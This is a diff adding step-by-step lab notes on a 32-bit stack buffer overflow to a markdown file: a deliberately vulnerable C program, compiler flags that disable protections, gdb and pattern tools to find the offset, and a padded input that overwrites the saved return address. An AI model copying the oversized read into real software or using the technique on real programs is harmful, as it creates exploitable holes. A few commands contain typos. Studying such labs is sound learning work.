@@ -332,3 +332,126 @@ int main(int argc, char * argv[]) {
     return 0;
 }
 ```
+
+# BOF (22.04 with minimal requirement)
+## Chapter 1 
+```
+sudo su
+```
+```
+apt install git build-essential libc6-dev gcc-multilib g++-multilib
+```
+```
+find /usr/include -name "libc-header-start.h"
+```
+```
+nano vuln.c 
+```
+```
+#include <stdio.h>
+#include <unistd.h>
+
+int overflow() {
+    char buffer[500];
+    int userinput;
+    userinput = read(0, buffer, 700);
+    printf("User provided %d bytes. Buffer content is: %s\n", userinput, buffer);
+    return 0;
+}
+
+int main(int argc, char * argv[]) {
+    overflow();
+    return 0;
+}
+```
+```
+gcc -g -fno-stack-protector -z execstack -no-pie -m32 -o vuln vuln.c
+```
+```
+python3 -c 'print("A"*700)' | ./vuln
+```
+```
+python3 -c 'print("A"*700)' > input.txt
+```
+after breakpoint
+```
+x $eip
+```
+```
+p/50 $eip
+```
+```
+x $ebp-0x200
+```
+```
+x $ebp-0x200
+```
+find input : 
+```
+x/4wx <use address at $ebp-0x200>
+```
+tape continue
+```
+c
+```
+```
+x $ebp-0x200
+```
+find input : 
+```
+x/4wx
+```
+``` 
+x/100wx <use address at $ebp-0x200>
+```
+```
+c
+```
+```
+x $eip
+```
+```
+p $esp
+```
+```
+x/4wx <p of esp>
+```
+```
+c
+```
+```
+exit
+```
+```
+pattern_create 700 pattern.txt
+```
+```
+gdb -q ./vuln
+```
+```
+d
+```
+```
+run < pattern.txt
+```
+```
+pattern_offset <@finded>
+```
+should be found at <@offset>
+```
+python3 -c 'print("A"*516+ "B"*4 + "C"*(700-516-4)) > input.txt
+```
+```
+cat input.txt
+```
+```
+gdb-peda -q ./vuln
+```
+```
+run < input.txt
+```
+
+
+
+
+
